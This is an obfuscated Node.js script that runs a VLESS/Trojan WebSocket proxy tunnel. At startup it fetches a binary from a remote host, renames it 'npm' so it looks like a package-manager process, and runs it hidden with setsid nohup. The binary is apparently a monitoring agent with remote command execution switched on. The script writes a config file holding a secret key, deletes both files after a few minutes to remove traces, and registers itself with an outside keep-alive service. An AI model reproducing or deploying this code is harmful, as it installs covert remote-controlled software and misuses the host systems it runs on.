const _0x25a786=_0x3f32;(function(_0x6c7d82,_0x22a049){const _0x432aa3=_0x3f32,_0x4680d1=_0x6c7d82();while(!![]){try{const _0xe68d4e=-parseInt(_0x432aa3(0x13f))/0x1*(parseInt(_0x432aa3(0x145))/0x2)+-parseInt(_0x432aa3(0x10c))/0x3+-parseInt(_0x432aa3(0xe6))/0x4*(-parseInt(_0x432aa3(0x11f))/0x5)+-parseInt(_0x432aa3(0x130))/0x6*(parseInt(_0x432aa3(0x10a))/0x7)+-parseInt(_0x432aa3(0x121))/0x8+-parseInt(_0x432aa3(0x154))/0x9+-parseInt(_0x432aa3(0xe8))/0xa*(-parseInt(_0x432aa3(0x148))/0xb);if(_0xe68d4e===_0x22a049)break;else _0x4680d1['push'](_0x4680d1['shift']());}catch(_0x17b02c){_0x4680d1['push'](_0x4680d1['shift']());}}}(_0x2abd,0x45e1f));const os=require('os'),http=require(_0x25a786(0xfd)),fs=require('fs'),axios=require('axios'),net=require('net'),path=require('path'),crypto=require('crypto'),{Buffer}=require('buffer'),{exec,execSync}=require(_0x25a786(0x11b)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x25a786(0x106)][_0x25a786(0x120)]||_0x25a786(0x10e),NEZHA_SERVER=process[_0x25a786(0x106)][_0x25a786(0x149)]||'',NEZHA_PORT=process['env'][_0x25a786(0x13a)]||'',NEZHA_KEY=process[_0x25a786(0x106)][_0x25a786(0x138)]||'',DOMAIN=process[_0x25a786(0x106)][_0x25a786(0x139)]||_0x25a786(0x105),AUTO_ACCESS=process[_0x25a786(0x106)][_0x25a786(0x15e)]||!![],WSPATH=process[_0x25a786(0x106)]['WSPATH']||UUID[_0x25a786(0x129)](0x0,0x8),SUB_PATH=process[_0x25a786(0x106)][_0x25a786(0x12d)]||'ken',NAME=process[_0x25a786(0x106)][_0x25a786(0xf7)]||_0x25a786(0x158),PORT=process[_0x25a786(0x106)][_0x25a786(0x146)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x3f9e09=_0x25a786;try{const _0x486663=await axios['get']('https://speed.cloudflare.com/meta'),_0x1a6dbc=_0x486663['data'];ISP=(_0x1a6dbc[_0x3f9e09(0x123)]+'-'+_0x1a6dbc[_0x3f9e09(0x14c)])['replace'](/ /g,'_');}catch(_0x14c7ce){ISP=_0x3f9e09(0xef);}};GetISP();const httpServer=http['createServer']((_0xca7455,_0x1c0d4f)=>{const _0x447c55=_0x25a786;if(_0xca7455[_0x447c55(0xfc)]==='/'){const _0x24c17b=path[_0x447c55(0xf4)](__dirname,_0x447c55(0xf3));fs[_0x447c55(0x142)](_0x24c17b,_0x447c55(0x13d),(_0x3e9429,_0x21e3c0)=>{const _0x11dcf2=_0x447c55;if(_0x3e9429){_0x1c0d4f[_0x11dcf2(0x14b)](0xc8,{'Content-Type':_0x11dcf2(0x147)}),_0x1c0d4f[_0x11dcf2(0x117)](_0x11dcf2(0x15f));return;}_0x1c0d4f[_0x11dcf2(0x14b)](0xc8,{'Content-Type':'text/html'}),_0x1c0d4f['end'](_0x21e3c0);});return;}else{if(_0xca7455['url']==='/'+SUB_PATH){const _0x2d6698='vless://'+UUID+'@'+DOMAIN+_0x447c55(0x155)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x447c55(0x111)+WSPATH+'#'+NAME+'-'+ISP,_0x1b61d9=_0x447c55(0x131)+UUID+'@'+DOMAIN+_0x447c55(0x14e)+DOMAIN+_0x447c55(0x128)+DOMAIN+_0x447c55(0x111)+WSPATH+'#'+NAME+'-'+ISP,_0x4a3c34=_0x2d6698+'\x0a'+_0x1b61d9,_0x3eff10=Buffer[_0x447c55(0x152)](_0x4a3c34)['toString'](_0x447c55(0x133));_0x1c0d4f[_0x447c55(0x14b)](0xc8,{'Content-Type':_0x447c55(0xf0)}),_0x1c0d4f['end'](_0x3eff10+'\x0a');}else _0x1c0d4f[_0x447c55(0x14b)](0x194,{'Content-Type':_0x447c55(0xf0)}),_0x1c0d4f[_0x447c55(0x117)](_0x447c55(0x12f));}}),wss=new WebSocket[(_0x25a786(0x125))]({'server':httpServer}),uuid=UUID[_0x25a786(0xf2)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x25a786(0x10f)];function _0x3f32(_0x549480,_0x26f36e){const _0x2abda5=_0x2abd();return _0x3f32=function(_0x3f32fa,_0x59ac54){_0x3f32fa=_0x3f32fa-0xe2;let _0x71311b=_0x2abda5[_0x3f32fa];return _0x71311b;},_0x3f32(_0x549480,_0x26f36e);}function _0x2abd(){const _0x32a87a=['get','length','child_process','includes','config.yaml','hex','5nNojdB','UUID','401544dEAcxr','readUInt16BE','country','application/json','Server','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','createHash','&fp=chrome&type=ws&host=','slice','443','pop','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','SUB_PATH','split','Not\x20Found\x0a','1148622BIhopr','trojan://','application/dns-json','base64','&type=A','finish','https://dns.google/resolve?name=','data','NEZHA_KEY','DOMAIN','NEZHA_PORT','8443','listen','utf8','npm\x20is\x20already\x20running,\x20skip\x20running...','559QVGCBC','https://arm64.ssss.nyc.mn/v1','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','readFile','unlink','error','218JdcbER','PORT','text/html','77qTwzlV','NEZHA_SERVER','npm\x20is\x20running','writeHead','asOrganization','\x20with\x20all\x20DNS\x20servers',':443?security=tls&sni=','once','update','readUInt8','from','send','1722852wlbepg',':443?encryption=none&security=tls&sni=','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','test','Hug','npm\x20download\x20successfully','digest','npm','true','sha224','AUTO_ACCESS','Hello\x20world!','toString','log','https://oooo.serv00.net/add-url','find','npm\x20running\x20error:','Automatic\x20Access\x20Task\x20added\x20successfully','writeFileSync','https://','1552468mFkkMY','Server\x20is\x20running\x20on\x20port\x20','827580rzwZpU','type','pipe','createWriteStream','then','false','write','Unknown','text/plain','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','replace','index.html','join','catch','post','NAME','utf-8','close','2053','2096','url','http','reduce','/bin/bash','substr','https://arm64.ssss.nyc.mn/agent','Answer','https://amd64.ssss.nyc.mn/agent','https://amd64.ssss.nyc.mn/v1','1234.abc.com','env','message','arm','decode','7CEsKTd','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','561585HjXOqs','Status','aaa6b096-1165-4bbe-935c-99f4ec902d02','1.1.1.1','2083','&path=%2F','client_secret:\x20','map','connect','setsid\x20nohup\x20./npm\x20-s\x20','every','end','trim'];_0x2abd=function(){return _0x32a87a;};return _0x2abd();}function resolveHost(_0xe98f6){return new Promise((_0x40e703,_0xf38256)=>{const _0x53f76b=_0x3f32;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x53f76b(0x157)](_0xe98f6)){_0x40e703(_0xe98f6);return;}let _0x550369=0x0;function _0x4b8527(){const _0x22a672=_0x53f76b;if(_0x550369>=DNS_SERVERS['length']){_0xf38256(new Error('Failed\x20to\x20resolve\x20'+_0xe98f6+_0x22a672(0x14d)));return;}const _0x118fdb=DNS_SERVERS[_0x550369];_0x550369++;const _0x1eb3b4=_0x22a672(0x136)+encodeURIComponent(_0xe98f6)+_0x22a672(0x134);axios[_0x22a672(0x119)](_0x1eb3b4,{'timeout':0x1388,'headers':{'Accept':_0x22a672(0x132)}})[_0x22a672(0xec)](_0x8fd174=>{const _0x5e623a=_0x22a672,_0x3b50fb=_0x8fd174['data'];if(_0x3b50fb[_0x5e623a(0x10d)]===0x0&&_0x3b50fb[_0x5e623a(0x102)]&&_0x3b50fb[_0x5e623a(0x102)][_0x5e623a(0x11a)]>0x0){const _0x3c182c=_0x3b50fb[_0x5e623a(0x102)][_0x5e623a(0x163)](_0xaf596e=>_0xaf596e[_0x5e623a(0xe9)]===0x1);if(_0x3c182c){_0x40e703(_0x3c182c[_0x5e623a(0x137)]);return;}}_0x4b8527();})[_0x22a672(0xf5)](_0x16c694=>{_0x4b8527();});}_0x4b8527();});}function handleVlessConnection(_0x195d12,_0x5a7c43){const _0x3324b4=_0x25a786,[_0x3f767f]=_0x5a7c43,_0x38c720=_0x5a7c43['slice'](0x1,0x11);if(!_0x38c720[_0x3324b4(0x116)]((_0x1ae815,_0x253c20)=>_0x1ae815==parseInt(uuid[_0x3324b4(0x100)](_0x253c20*0x2,0x2),0x10)))return![];let _0x5b9df7=_0x5a7c43[_0x3324b4(0x129)](0x11,0x12)[_0x3324b4(0x151)]()+0x13;const _0x34515e=_0x5a7c43[_0x3324b4(0x129)](_0x5b9df7,_0x5b9df7+=0x2)[_0x3324b4(0x122)](0x0),_0x299f89=_0x5a7c43[_0x3324b4(0x129)](_0x5b9df7,_0x5b9df7+=0x1)[_0x3324b4(0x151)](),_0x53200d=_0x299f89==0x1?_0x5a7c43[_0x3324b4(0x129)](_0x5b9df7,_0x5b9df7+=0x4)[_0x3324b4(0xf4)]('.'):_0x299f89==0x2?new TextDecoder()[_0x3324b4(0x109)](_0x5a7c43[_0x3324b4(0x129)](_0x5b9df7+0x1,_0x5b9df7+=0x1+_0x5a7c43[_0x3324b4(0x129)](_0x5b9df7,_0x5b9df7+0x1)[_0x3324b4(0x151)]())):_0x299f89==0x3?_0x5a7c43[_0x3324b4(0x129)](_0x5b9df7,_0x5b9df7+=0x10)[_0x3324b4(0xfe)]((_0x556d1a,_0x4ad9d1,_0x1e958e,_0x5445c6)=>_0x1e958e%0x2?_0x556d1a['concat'](_0x5445c6[_0x3324b4(0x129)](_0x1e958e-0x1,_0x1e958e+0x1)):_0x556d1a,[])['map'](_0x218e04=>_0x218e04[_0x3324b4(0x122)](0x0)[_0x3324b4(0x160)](0x10))[_0x3324b4(0xf4)](':'):'';_0x195d12[_0x3324b4(0x153)](new Uint8Array([_0x3f767f,0x0]));const _0x1db204=createWebSocketStream(_0x195d12);return resolveHost(_0x53200d)[_0x3324b4(0xec)](_0x5a38d8=>{const _0x396e80=_0x3324b4;net[_0x396e80(0x114)]({'host':_0x5a38d8,'port':_0x34515e},function(){const _0x45bfbe=_0x396e80;this[_0x45bfbe(0xee)](_0x5a7c43[_0x45bfbe(0x129)](_0x5b9df7)),_0x1db204['on'](_0x45bfbe(0x144),()=>{})[_0x45bfbe(0xea)](this)['on'](_0x45bfbe(0x144),()=>{})[_0x45bfbe(0xea)](_0x1db204);})['on']('error',()=>{});})[_0x3324b4(0xf5)](_0x40d6bb=>{const _0x6960b4=_0x3324b4;net['connect']({'host':_0x53200d,'port':_0x34515e},function(){const _0x5c6aff=_0x3f32;this[_0x5c6aff(0xee)](_0x5a7c43[_0x5c6aff(0x129)](_0x5b9df7)),_0x1db204['on']('error',()=>{})[_0x5c6aff(0xea)](this)['on'](_0x5c6aff(0x144),()=>{})[_0x5c6aff(0xea)](_0x1db204);})['on'](_0x6960b4(0x144),()=>{});}),!![];}function handleTrojanConnection(_0x5a4265,_0x4a7297){const _0x298d37=_0x25a786;try{if(_0x4a7297[_0x298d37(0x11a)]<0x3a)return![];const _0x4a91bf=_0x4a7297['slice'](0x0,0x38)[_0x298d37(0x160)](),_0x3e1a93=[UUID];let _0x1e4013=null;for(const _0x598826 of _0x3e1a93){const _0xce647e=crypto[_0x298d37(0x127)](_0x298d37(0x15d))[_0x298d37(0x150)](_0x598826)[_0x298d37(0x15a)](_0x298d37(0x11e));if(_0xce647e===_0x4a91bf){_0x1e4013=_0x598826;break;}}if(!_0x1e4013)return![];let _0xac348e=0x38;_0x4a7297[_0xac348e]===0xd&&_0x4a7297[_0xac348e+0x1]===0xa&&(_0xac348e+=0x2);const _0xf159fd=_0x4a7297[_0xac348e];if(_0xf159fd!==0x1)return![];_0xac348e+=0x1;const _0x1884d6=_0x4a7297[_0xac348e];_0xac348e+=0x1;let _0x143673,_0x274694;if(_0x1884d6===0x1)_0x143673=_0x4a7297[_0x298d37(0x129)](_0xac348e,_0xac348e+0x4)['join']('.'),_0xac348e+=0x4;else{if(_0x1884d6===0x3){const _0x1b4c99=_0x4a7297[_0xac348e];_0xac348e+=0x1,_0x143673=_0x4a7297['slice'](_0xac348e,_0xac348e+_0x1b4c99)[_0x298d37(0x160)](),_0xac348e+=_0x1b4c99;}else{if(_0x1884d6===0x4)_0x143673=_0x4a7297[_0x298d37(0x129)](_0xac348e,_0xac348e+0x10)[_0x298d37(0xfe)]((_0x51d8ad,_0x7877e7,_0x27d105,_0x319a7a)=>_0x27d105%0x2?_0x51d8ad['concat'](_0x319a7a[_0x298d37(0x129)](_0x27d105-0x1,_0x27d105+0x1)):_0x51d8ad,[])[_0x298d37(0x113)](_0x54a330=>_0x54a330[_0x298d37(0x122)](0x0)['toString'](0x10))[_0x298d37(0xf4)](':'),_0xac348e+=0x10;else return![];}}_0x274694=_0x4a7297[_0x298d37(0x122)](_0xac348e),_0xac348e+=0x2;_0xac348e<_0x4a7297['length']&&_0x4a7297[_0xac348e]===0xd&&_0x4a7297[_0xac348e+0x1]===0xa&&(_0xac348e+=0x2);const _0x495e7c=createWebSocketStream(_0x5a4265);return resolveHost(_0x143673)[_0x298d37(0xec)](_0x560e5f=>{const _0x101ee7=_0x298d37;net[_0x101ee7(0x114)]({'host':_0x560e5f,'port':_0x274694},function(){const _0x11cd75=_0x101ee7;_0xac348e<_0x4a7297['length']&&this[_0x11cd75(0xee)](_0x4a7297['slice'](_0xac348e)),_0x495e7c['on'](_0x11cd75(0x144),()=>{})[_0x11cd75(0xea)](this)['on'](_0x11cd75(0x144),()=>{})[_0x11cd75(0xea)](_0x495e7c);})['on']('error',()=>{});})[_0x298d37(0xf5)](_0x2f5138=>{const _0x4fb342=_0x298d37;net['connect']({'host':_0x143673,'port':_0x274694},function(){const _0x20f1b0=_0x3f32;_0xac348e<_0x4a7297[_0x20f1b0(0x11a)]&&this[_0x20f1b0(0xee)](_0x4a7297[_0x20f1b0(0x129)](_0xac348e)),_0x495e7c['on'](_0x20f1b0(0x144),()=>{})[_0x20f1b0(0xea)](this)['on']('error',()=>{})[_0x20f1b0(0xea)](_0x495e7c);})['on'](_0x4fb342(0x144),()=>{});}),!![];}catch(_0x446ec5){return![];}}wss['on']('connection',(_0x1978d5,_0x12f10)=>{const _0x48ed3b=_0x25a786,_0x206b23=_0x12f10['url']||'';_0x1978d5[_0x48ed3b(0x14f)](_0x48ed3b(0x107),_0x39acb1=>{const _0x136d16=_0x48ed3b;if(_0x39acb1[_0x136d16(0x11a)]>0x11&&_0x39acb1[0x0]===0x0){const _0x5d62f0=_0x39acb1[_0x136d16(0x129)](0x1,0x11),_0x75bf7e=_0x5d62f0['every']((_0x33ad7c,_0x128073)=>_0x33ad7c==parseInt(uuid[_0x136d16(0x100)](_0x128073*0x2,0x2),0x10));if(_0x75bf7e){!handleVlessConnection(_0x1978d5,_0x39acb1)&&_0x1978d5[_0x136d16(0xf9)]();return;}}!handleTrojanConnection(_0x1978d5,_0x39acb1)&&_0x1978d5[_0x136d16(0xf9)]();})['on'](_0x48ed3b(0x144),()=>{});});const getDownloadUrl=()=>{const _0x51d681=_0x25a786,_0x22f178=os['arch']();return _0x22f178===_0x51d681(0x108)||_0x22f178==='arm64'||_0x22f178==='aarch64'?!NEZHA_PORT?_0x51d681(0x140):_0x51d681(0x101):!NEZHA_PORT?_0x51d681(0x104):_0x51d681(0x103);},downloadFile=async()=>{const _0x3d54b0=_0x25a786;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x5b4c72=getDownloadUrl(),_0x4e1fad=await axios({'method':'get','url':_0x5b4c72,'responseType':'stream'}),_0x6a18be=fs[_0x3d54b0(0xeb)](_0x3d54b0(0x15b));return _0x4e1fad[_0x3d54b0(0x137)]['pipe'](_0x6a18be),new Promise((_0x344e84,_0x4df76d)=>{const _0x52c9a4=_0x3d54b0;_0x6a18be['on'](_0x52c9a4(0x135),()=>{const _0xb7a676=_0x52c9a4;console[_0xb7a676(0x161)](_0xb7a676(0x159)),exec('chmod\x20+x\x20npm',_0x12dfe1=>{if(_0x12dfe1)_0x4df76d(_0x12dfe1);_0x344e84();});}),_0x6a18be['on'](_0x52c9a4(0x144),_0x4df76d);});}catch(_0x23faf5){throw _0x23faf5;}},runnz=async()=>{const _0x1059a7=_0x25a786;try{const _0x3c901e=execSync(_0x1059a7(0x156),{'encoding':_0x1059a7(0xf8)});if(_0x3c901e[_0x1059a7(0x118)]()!==''){console[_0x1059a7(0x161)](_0x1059a7(0x13e));return;}}catch(_0x459848){}await downloadFile();let _0x339491='',_0xd5790d=[_0x1059a7(0x12a),_0x1059a7(0x13b),_0x1059a7(0xfb),'2087',_0x1059a7(0x110),_0x1059a7(0xfa)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0xe53209=_0xd5790d['includes'](NEZHA_PORT)?'--tls':'';_0x339491=_0x1059a7(0x115)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0xe53209+_0x1059a7(0x10b);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xb31f5a=NEZHA_SERVER[_0x1059a7(0x11c)](':')?NEZHA_SERVER[_0x1059a7(0x12e)](':')[_0x1059a7(0x12b)]():'',_0x13b2ce=_0xd5790d[_0x1059a7(0x11c)](_0xb31f5a)?_0x1059a7(0x15c):_0x1059a7(0xed),_0xa48b2d=_0x1059a7(0x112)+NEZHA_KEY+_0x1059a7(0x12c)+NEZHA_SERVER+_0x1059a7(0x126)+_0x13b2ce+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x1059a7(0xe4)](_0x1059a7(0x11d),_0xa48b2d);}_0x339491=_0x1059a7(0x141);}else{console[_0x1059a7(0x161)](_0x1059a7(0xf1));return;}}try{exec(_0x339491,{'shell':_0x1059a7(0xff)},_0x259db5=>{const _0x3f4aa6=_0x1059a7;if(_0x259db5)console[_0x3f4aa6(0x144)](_0x3f4aa6(0xe2),_0x259db5);else console[_0x3f4aa6(0x161)](_0x3f4aa6(0x14a));});}catch(_0x2629a6){console[_0x1059a7(0x144)]('error:\x20'+_0x2629a6);}};async function addAccessTask(){const _0x106bb1=_0x25a786;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x56a3f6=_0x106bb1(0xe5)+DOMAIN+'/'+SUB_PATH;try{const _0x53c19a=await axios[_0x106bb1(0xf6)](_0x106bb1(0x162),{'url':_0x56a3f6},{'headers':{'Content-Type':_0x106bb1(0x124)}});console[_0x106bb1(0x161)](_0x106bb1(0xe3));}catch(_0x501187){}}const delFiles=()=>{const _0x42b99f=_0x25a786;fs[_0x42b99f(0x143)]('npm',()=>{}),fs['unlink'](_0x42b99f(0x11d),()=>{});};httpServer[_0x25a786(0x13c)](PORT,()=>{const _0x57c419=_0x25a786;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x57c419(0x161)](_0x57c419(0xe7)+PORT);});
